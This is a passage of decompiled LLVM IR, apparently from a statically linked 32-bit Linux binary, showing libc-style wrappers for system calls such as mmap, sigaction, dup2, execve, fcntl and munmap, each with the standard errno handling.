  %v0_804f2db = phi %sigaction* [ null, %dec_label_pc_804f2cb ], [ %phitmp, %dec_label_pc_804f2d1 ]
  %v5_804f2e3 = call i32 @function_804f434(i32 %arg1, %sigaction* %v0_804f2db, i32 %v0_804f2da, i32 8)
  store i32 %v5_804f2e3, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f2c3, label %dec_label_pc_804f326, label %dec_label_pc_804f2f1

dec_label_pc_804f2f1:                             ; preds = %dec_label_pc_804f2d8
  %v2_804f2f1 = icmp slt i32 %v5_804f2e3, 0
  br i1 %v2_804f2f1, label %dec_label_pc_804f326, label %dec_label_pc_804f2f5

dec_label_pc_804f2f5:                             ; preds = %dec_label_pc_804f2f1
  %v3_804f2f5 = load i32, i32* %stack_var_-288, align 4
  %v2_804f2f9 = inttoptr i32 %arg3 to i32*
  store i32 %v3_804f2f5, i32* %v2_804f2f9, align 4
  %v2_804f301 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804f306 = add i32 %arg3, 4
  %v3_804f30a = inttoptr i32 %v1_804f306 to i16*
  %v4_804f30a = call i32 @function_804d1a8(i16* %v3_804f30a, i32 %v2_804f301, i32 128)
  %v2_804f313 = add i32 %arg3, 132
  %v3_804f313 = inttoptr i32 %v2_804f313 to i32*
  %v2_804f320 = add i32 %arg3, 136
  %v3_804f320 = inttoptr i32 %v2_804f320 to i32*
  %v0_804f32c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f326

dec_label_pc_804f326:                             ; preds = %dec_label_pc_804f2f1, %dec_label_pc_804f2d8, %dec_label_pc_804f2f5
  %v0_804f32c = phi i32 [ %v5_804f2e3, %dec_label_pc_804f2f1 ], [ %v5_804f2e3, %dec_label_pc_804f2d8 ], [ %v0_804f32c.pre, %dec_label_pc_804f2f5 ]
  store i32 %v0_804f258, i32* @ebx, align 4
  store i32 %v0_804f257, i32* @esi, align 4
  ret i32 %v0_804f32c

; uselistorder directives
  uselistorder i1 %v1_804f2c3, { 1, 0 }
  uselistorder i1 %v1_804f26d, { 1, 0 }
  uselistorder i32* null, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804f326, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f2d8, { 1, 0 }
  uselistorder label %dec_label_pc_804f2cb, { 1, 0 }
  uselistorder label %dec_label_pc_804f2c1, { 1, 0 }
}

define i32 @function_804f334() local_unnamed_addr {
dec_label_pc_804f334:
  %v0_804f33a = call i32 @vfork()
  %v5_804f33d = icmp ult i32 %v0_804f33a, -4095
  %v1_804f342 = icmp eq i1 %v5_804f33d, false
  call void @__pseudo_cond_branch(i1 %v1_804f342, i32 134549584)
  ret i32 %v0_804f33a
}

define i32 @function_804f34c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804f34c:
  %stack_var_4 = alloca i32, align 4
  %v0_804f34c = load i32, i32* @ebx, align 4
  store i32 %v0_804f34c, i32* @edx, align 4
  %v2_804f357 = load i32, i32* @ecx, align 4
  %v4_804f357 = load i32, i32* @esi, align 4
  %v5_804f357 = load i32, i32* @edi, align 4
  %v6_804f357 = load i32, i32* @ebp, align 4
  %v7_804f357 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_804f357, i32 %v0_804f34c, i32 %v4_804f357, i32 %v5_804f357, i32 %v6_804f357)
  %v8_804f357 = ptrtoint i32* %v7_804f357 to i32
  store i32 %v0_804f34c, i32* @ebx, align 4
  %tmp = icmp ugt i32* %v7_804f357, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %tmp, i32 134549584)
  ret i32 %v8_804f357

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134549584, { 1, 0 }
}

define i32 @function_804f368(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f368:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f368 = load i32, i32* @ebx, align 4
  store i32 %v0_804f368, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804f37b = call i32 @int80_syscall(i32 102)
  store i32 %v1_804f37b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f37b, -4095
  br i1 %tmp, label %dec_label_pc_804f394, label %dec_label_pc_804f388

dec_label_pc_804f388:                             ; preds = %dec_label_pc_804f368
  %v0_804f388 = load i32, i32* %stack_var_-4, align 4
  %v1_804f388 = call i32 @function_804b7f4(i32 %v0_804f388)
  %v0_804f38d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f38d = sub i32 0, %v0_804f38d
  %v2_804f38f = inttoptr i32 %v1_804f388 to i32*
  store i32 %v1_804f38d, i32* %v2_804f38f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f394

dec_label_pc_804f394:                             ; preds = %dec_label_pc_804f368, %dec_label_pc_804f388
  %v0_804f395 = phi i32 [ %v1_804f37b, %dec_label_pc_804f368 ], [ -1, %dec_label_pc_804f388 ]
  %v2_804f394 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f394, i32* @edx, align 4
  %v2_804f398 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f398, i32* @ebx, align 4
  ret i32 %v0_804f395

; uselistorder directives
  uselistorder i32 %v1_804f37b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f394, { 1, 0 }
}

define i32 @function_804f39c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f39c:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f39c = load i32, i32* @edi, align 4
  %v0_804f39d = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_804f3b5 = add i32 %arg2, -12
  %v6_804f3bb = icmp ugt i32 %v1_804f3b5, 2
  br i1 %v6_804f3bb, label %dec_label_pc_804f3cb, label %dec_label_pc_804f3bd

dec_label_pc_804f3bd:                             ; preds = %dec_label_pc_804f39c
  %v4_804f3c1 = call i32 @function_804f3f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804f3b5)
  br label %dec_label_pc_804f3ed

dec_label_pc_804f3cb:                             ; preds = %dec_label_pc_804f39c
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804f3d3 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804f3d3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804f3d3, -4095
  br i1 %tmp, label %dec_label_pc_804f3eb, label %dec_label_pc_804f3df

dec_label_pc_804f3df:                             ; preds = %dec_label_pc_804f3cb
  %v1_804f3df = call i32 @function_804b7f4(i32 %v0_804f39d)
  %v0_804f3e4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f3e4 = sub i32 0, %v0_804f3e4
  %v2_804f3e6 = inttoptr i32 %v1_804f3df to i32*
  store i32 %v1_804f3e4, i32* %v2_804f3e6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f3eb

dec_label_pc_804f3eb:                             ; preds = %dec_label_pc_804f3cb, %dec_label_pc_804f3df
  %v0_804f3eb = phi i32 [ %v2_804f3d3, %dec_label_pc_804f3cb ], [ -1, %dec_label_pc_804f3df ]
  br label %dec_label_pc_804f3ed

dec_label_pc_804f3ed:                             ; preds = %dec_label_pc_804f3bd, %dec_label_pc_804f3eb
  %v0_804f3f2 = phi i32 [ %v4_804f3c1, %dec_label_pc_804f3bd ], [ %v0_804f3eb, %dec_label_pc_804f3eb ]
  store i32 %v0_804f39d, i32* @ebx, align 4
  store i32 %v0_804f39c, i32* @edi, align 4
  ret i32 %v0_804f3f2

; uselistorder directives
  uselistorder i32 %v2_804f3d3, { 1, 0, 2 }
  uselistorder i32 %v0_804f39d, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804f3ed, { 1, 0 }
  uselistorder label %dec_label_pc_804f3eb, { 1, 0 }
}

define i32 @function_804f3f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f3f4:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f3f4 = load i32, i32* @edi, align 4
  store i32 %v0_804f3f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804f40c = load i32, i32* @ebx, align 4
  %v1_804f414 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804f414, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f414, -4095
  br i1 %tmp, label %dec_label_pc_804f42c, label %dec_label_pc_804f420

dec_label_pc_804f420:                             ; preds = %dec_label_pc_804f3f4
  %v1_804f420 = call i32 @function_804b7f4(i32 %v0_804f40c)
  %v0_804f425 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f425 = sub i32 0, %v0_804f425
  %v2_804f427 = inttoptr i32 %v1_804f420 to i32*
  store i32 %v1_804f425, i32* %v2_804f427, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f42c

dec_label_pc_804f42c:                             ; preds = %dec_label_pc_804f3f4, %dec_label_pc_804f420
  %v0_804f42f = phi i32 [ %v1_804f414, %dec_label_pc_804f3f4 ], [ -1, %dec_label_pc_804f420 ]
  %v2_804f431 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f431, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f42f

; uselistorder directives
  uselistorder i32 %v1_804f414, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f42c, { 1, 0 }
}

define i32 @function_804f434(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f434:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_804f435 = load i32, i32* @esi, align 4
  store i32 %v0_804f435, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804f449 = load i32, i32* @ebx, align 4
  %v7_804f451 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804f451, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_804f451, -4095
  br i1 %tmp, label %dec_label_pc_804f469, label %dec_label_pc_804f45d

dec_label_pc_804f45d:                             ; preds = %dec_label_pc_804f434
  %v1_804f45d = call i32 @function_804b7f4(i32 %v0_804f449)
  %v0_804f462 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f462 = sub i32 0, %v0_804f462
  %v2_804f464 = inttoptr i32 %v1_804f45d to i32*
  store i32 %v1_804f462, i32* %v2_804f464, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f469

dec_label_pc_804f469:                             ; preds = %dec_label_pc_804f434, %dec_label_pc_804f45d
  %v0_804f46a = phi i32 [ %v7_804f451, %dec_label_pc_804f434 ], [ -1, %dec_label_pc_804f45d ]
  %v2_804f46c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f46c, i32* @esi, align 4
  ret i32 %v0_804f46a

; uselistorder directives
  uselistorder i32 %v7_804f451, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f469, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_804f470(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_804f470:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_804f498(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f498:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f498 = load i32, i32* @ebx, align 4
  store i32 %v0_804f498, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804f4ab = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804f4ab, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804f4ab, -4095
  br i1 %tmp, label %dec_label_pc_804f4c4, label %dec_label_pc_804f4b8

dec_label_pc_804f4b8:                             ; preds = %dec_label_pc_804f498
  %v0_804f4b8 = load i32, i32* %stack_var_-4, align 4
  %v1_804f4b8 = call i32 @function_804b7f4(i32 %v0_804f4b8)
  %v0_804f4bd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f4bd = sub i32 0, %v0_804f4bd
  %v2_804f4bf = inttoptr i32 %v1_804f4b8 to i32*
  store i32 %v1_804f4bd, i32* %v2_804f4bf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f4c4

dec_label_pc_804f4c4:                             ; preds = %dec_label_pc_804f498, %dec_label_pc_804f4b8
  %v0_804f4c5 = phi i32 [ %v4_804f4ab, %dec_label_pc_804f498 ], [ -1, %dec_label_pc_804f4b8 ]
  %v2_804f4c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f4c4, i32* @edx, align 4
  %v2_804f4c8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f4c8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f4c5

; uselistorder directives
  uselistorder i32 %v4_804f4ab, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f4c4, { 1, 0 }
}

define i32 @function_804f4cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f4cc:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f4cc = load i32, i32* @ebx, align 4
  store i32 %v0_804f4cc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804f4df = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_804f4df, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804f4df, -4095
  br i1 %tmp, label %dec_label_pc_804f4f8, label %dec_label_pc_804f4ec

dec_label_pc_804f4ec:                             ; preds = %dec_label_pc_804f4cc
  %v0_804f4ec = load i32, i32* %stack_var_-4, align 4
  %v1_804f4ec = call i32 @function_804b7f4(i32 %v0_804f4ec)
  %v0_804f4f1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f4f1 = sub i32 0, %v0_804f4f1
  %v2_804f4f3 = inttoptr i32 %v1_804f4ec to i32*
  store i32 %v1_804f4f1, i32* %v2_804f4f3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f4f8

dec_label_pc_804f4f8:                             ; preds = %dec_label_pc_804f4cc, %dec_label_pc_804f4ec
  %v0_804f4f9 = phi i32 [ %v2_804f4df, %dec_label_pc_804f4cc ], [ -1, %dec_label_pc_804f4ec ]
  %v2_804f4fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f4fc, i32* @ebx, align 4
  ret i32 %v0_804f4f9

; uselistorder directives
  uselistorder i32 %v2_804f4df, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f4f8, { 1, 0 }
}

define i32 @function_804f500(i8* %arg1) local_unnamed_addr {
dec_label_pc_804f500:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f500 = load i32, i32* @edi, align 4
  store i32 %v0_804f500, i32* %stack_var_-4, align 4
  %v4_804f504 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f504, i32* %edi.global-to-local, align 4
  %v0_804f510 = load i32, i32* @ebx, align 4
  %v5_804f518 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_804f518 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_804f518 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_804f518, [1 x i8*] %v8_804f518)
  store i32 %v9_804f518, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_804f518, -4095
  br i1 %tmp12, label %dec_label_pc_804f530, label %dec_label_pc_804f524

dec_label_pc_804f524:                             ; preds = %dec_label_pc_804f500
  %v1_804f524 = call i32 @function_804b7f4(i32 %v0_804f510)
  %v0_804f529 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f529 = sub i32 0, %v0_804f529
  %v2_804f52b = inttoptr i32 %v1_804f524 to i32*
  store i32 %v1_804f529, i32* %v2_804f52b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f530

dec_label_pc_804f530:                             ; preds = %dec_label_pc_804f500, %dec_label_pc_804f524
  %v0_804f531 = phi i32 [ %v9_804f518, %dec_label_pc_804f500 ], [ -1, %dec_label_pc_804f524 ]
  %v2_804f534 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f534, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f531

; uselistorder directives
  uselistorder i32 %v9_804f518, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f530, { 1, 0 }
}

define i32 @function_804f538() local_unnamed_addr {
dec_label_pc_804f538:
  %stack_var_-8 = alloca i32, align 4
  %v2_804f53b = ptrtoint i32* %stack_var_-8 to i32
  %v2_804f542 = call i32 @function_804f5ec(i32 7, i32 %v2_804f53b)
  store i32 256, i32* @edx, align 4
  %v2_804f54f = icmp slt i32 %v2_804f542, 0
  br i1 %v2_804f54f, label %dec_label_pc_804f557, label %dec_label_pc_804f553

dec_label_pc_804f553:                             ; preds = %dec_label_pc_804f538
  %v3_804f553 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804f553, i32* @edx, align 4
  br label %dec_label_pc_804f557

dec_label_pc_804f557:                             ; preds = %dec_label_pc_804f538, %dec_label_pc_804f553
  %v0_804f557 = phi i32 [ 256, %dec_label_pc_804f538 ], [ %v3_804f553, %dec_label_pc_804f553 ]
  ret i32 %v0_804f557

; uselistorder directives
  uselistorder label %dec_label_pc_804f557, { 1, 0 }
}

define i32 @function_804f560() local_unnamed_addr {
dec_label_pc_804f560:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f560 = load i32, i32* @ebx, align 4
  store i32 %v0_804f560, i32* %stack_var_-4, align 4
  %v1_804f569 = call i32 @int80_syscall(i32 202)
  store i32 %v1_804f569, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f569, -4095
  br i1 %tmp, label %dec_label_pc_804f580, label %dec_label_pc_804f574

dec_label_pc_804f574:                             ; preds = %dec_label_pc_804f560
  %v0_804f574 = load i32, i32* %stack_var_-4, align 4
  %v1_804f574 = call i32 @function_804b7f4(i32 %v0_804f574)
  %v0_804f579 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f579 = sub i32 0, %v0_804f579
  %v2_804f57b = inttoptr i32 %v1_804f574 to i32*
  store i32 %v1_804f579, i32* %v2_804f57b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f580

dec_label_pc_804f580:                             ; preds = %dec_label_pc_804f560, %dec_label_pc_804f574
  %v0_804f581 = phi i32 [ %v1_804f569, %dec_label_pc_804f560 ], [ -1, %dec_label_pc_804f574 ]
  %v2_804f584 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f584, i32* @ebx, align 4
  ret i32 %v0_804f581

; uselistorder directives
  uselistorder i32 %v1_804f569, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f580, { 1, 0 }
}

define i32 @function_804f588() local_unnamed_addr {
dec_label_pc_804f588:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f588 = load i32, i32* @ebx, align 4
  store i32 %v0_804f588, i32* %stack_var_-4, align 4
  %v1_804f591 = call i32 @int80_syscall(i32 201)
  store i32 %v1_804f591, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f591, -4095
  br i1 %tmp, label %dec_label_pc_804f5a8, label %dec_label_pc_804f59c

dec_label_pc_804f59c:                             ; preds = %dec_label_pc_804f588
  %v0_804f59c = load i32, i32* %stack_var_-4, align 4
  %v1_804f59c = call i32 @function_804b7f4(i32 %v0_804f59c)
  %v0_804f5a1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f5a1 = sub i32 0, %v0_804f5a1
  %v2_804f5a3 = inttoptr i32 %v1_804f59c to i32*
  store i32 %v1_804f5a1, i32* %v2_804f5a3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f5a8

dec_label_pc_804f5a8:                             ; preds = %dec_label_pc_804f588, %dec_label_pc_804f59c
  %v0_804f5a9 = phi i32 [ %v1_804f591, %dec_label_pc_804f588 ], [ -1, %dec_label_pc_804f59c ]
  %v2_804f5ac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f5ac, i32* @ebx, align 4
  ret i32 %v0_804f5a9

; uselistorder directives
  uselistorder i32 %v1_804f591, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f5a8, { 1, 0 }
}

define i32 @function_804f5b0() local_unnamed_addr {
dec_label_pc_804f5b0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f5b0 = load i32, i32* @ebx, align 4
  store i32 %v0_804f5b0, i32* %stack_var_-4, align 4
  %v1_804f5b9 = call i32 @int80_syscall(i32 200)
  store i32 %v1_804f5b9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f5b9, -4095
  br i1 %tmp, label %dec_label_pc_804f5d0, label %dec_label_pc_804f5c4

dec_label_pc_804f5c4:                             ; preds = %dec_label_pc_804f5b0
  %v0_804f5c4 = load i32, i32* %stack_var_-4, align 4
  %v1_804f5c4 = call i32 @function_804b7f4(i32 %v0_804f5c4)
  %v0_804f5c9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f5c9 = sub i32 0, %v0_804f5c9
  %v2_804f5cb = inttoptr i32 %v1_804f5c4 to i32*
  store i32 %v1_804f5c9, i32* %v2_804f5cb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f5d0

dec_label_pc_804f5d0:                             ; preds = %dec_label_pc_804f5b0, %dec_label_pc_804f5c4
  %v0_804f5d1 = phi i32 [ %v1_804f5b9, %dec_label_pc_804f5b0 ], [ -1, %dec_label_pc_804f5c4 ]
  %v2_804f5d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f5d4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f5d1

; uselistorder directives
  uselistorder i32 %v1_804f5b9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f5d0, { 1, 0 }
}

define i32 @function_804f5d8() local_unnamed_addr {
dec_label_pc_804f5d8:
  %v0_804f5d8 = load i32, i32* @global_var_8058470.179, align 16
  store i32 %v0_804f5d8, i32* @edx, align 4
  %v1_804f5e3 = icmp eq i32 %v0_804f5d8, 0
  %v1_804f5e5 = icmp eq i1 %v1_804f5e3, false
  %v4_804f5e5 = select i1 %v1_804f5e5, i32 %v0_804f5d8, i32 4096
  ret i32 %v4_804f5e5
}

define i32 @function_804f5ec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f5ec:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f5ec = load i32, i32* @ebx, align 4
  store i32 %v0_804f5ec, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804f5ff = call i32 @int80_syscall(i32 191)
  store i32 %v1_804f5ff, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f5ff, -4095
  br i1 %tmp, label %dec_label_pc_804f618, label %dec_label_pc_804f60c

dec_label_pc_804f60c:                             ; preds = %dec_label_pc_804f5ec
  %v0_804f60c = load i32, i32* %stack_var_-4, align 4
  %v1_804f60c = call i32 @function_804b7f4(i32 %v0_804f60c)
  %v0_804f611 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f611 = sub i32 0, %v0_804f611
  %v2_804f613 = inttoptr i32 %v1_804f60c to i32*
  store i32 %v1_804f611, i32* %v2_804f613, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f618

dec_label_pc_804f618:                             ; preds = %dec_label_pc_804f5ec, %dec_label_pc_804f60c
  %v0_804f619 = phi i32 [ %v1_804f5ff, %dec_label_pc_804f5ec ], [ -1, %dec_label_pc_804f60c ]
  %v2_804f61c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f61c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f619

; uselistorder directives
  uselistorder i32 %v1_804f5ff, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 191, { 1, 0 }
  uselistorder label %dec_label_pc_804f618, { 1, 0 }
}

define i32 @function_804f620() local_unnamed_addr {
dec_label_pc_804f620:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f620 = load i32, i32* @ebx, align 4
  store i32 %v0_804f620, i32* %stack_var_-4, align 4
  %v1_804f629 = call i32 @int80_syscall(i32 199)
  store i32 %v1_804f629, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f629, -4095
  br i1 %tmp, label %dec_label_pc_804f640, label %dec_label_pc_804f634

dec_label_pc_804f634:                             ; preds = %dec_label_pc_804f620
  %v0_804f634 = load i32, i32* %stack_var_-4, align 4
  %v1_804f634 = call i32 @function_804b7f4(i32 %v0_804f634)
  %v0_804f639 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f639 = sub i32 0, %v0_804f639
  %v2_804f63b = inttoptr i32 %v1_804f634 to i32*
  store i32 %v1_804f639, i32* %v2_804f63b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f640

dec_label_pc_804f640:                             ; preds = %dec_label_pc_804f620, %dec_label_pc_804f634
  %v0_804f641 = phi i32 [ %v1_804f629, %dec_label_pc_804f620 ], [ -1, %dec_label_pc_804f634 ]
  %v2_804f644 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f644, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f641

; uselistorder directives
  uselistorder i32 %v1_804f629, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f640, { 1, 0 }
}

define i32 @function_804f648(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f648:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f648 = load i32, i32* @ebx, align 4
  store i32 %v0_804f648, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_804f65b = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_804f65b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_804f65b, -4095
  br i1 %tmp, label %dec_label_pc_804f674, label %dec_label_pc_804f668

dec_label_pc_804f668:                             ; preds = %dec_label_pc_804f648
  %v0_804f668 = load i32, i32* %stack_var_-4, align 4
  %v1_804f668 = call i32 @function_804b7f4(i32 %v0_804f668)
  %v0_804f66d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f66d = sub i32 0, %v0_804f66d
  %v2_804f66f = inttoptr i32 %v1_804f668 to i32*
  store i32 %v1_804f66d, i32* %v2_804f66f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f674

dec_label_pc_804f674:                             ; preds = %dec_label_pc_804f648, %dec_label_pc_804f668
  %v0_804f675 = phi i32 [ %v3_804f65b, %dec_label_pc_804f648 ], [ -1, %dec_label_pc_804f668 ]
  %v2_804f674 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f674, i32* @edx, align 4
  %v2_804f678 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f678, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f675

; uselistorder directives
  uselistorder i32 %v3_804f65b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f674, { 1, 0 }
}

